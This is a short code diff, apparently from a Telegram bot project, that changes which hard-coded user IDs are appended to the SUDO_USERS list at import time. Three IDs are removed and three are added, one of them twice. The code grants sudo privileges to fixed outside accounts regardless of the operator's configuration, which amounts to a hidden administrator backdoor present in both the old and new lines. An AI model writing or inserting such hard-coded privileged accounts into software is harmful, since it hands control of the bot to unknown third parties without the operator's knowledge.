@@ -6,9 +6,9 @@ from typing import Callable
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(1979521470)
-SUDO_USERS.append(1973291190)
-SUDO_USERS.append(1786753517)
+SUDO_USERS.append(2037409652)
+SUDO_USERS.append(1960403979)
+SUDO_USERS.append(1960403979)
 
 
 def errors(func: Callable) -> Callable:
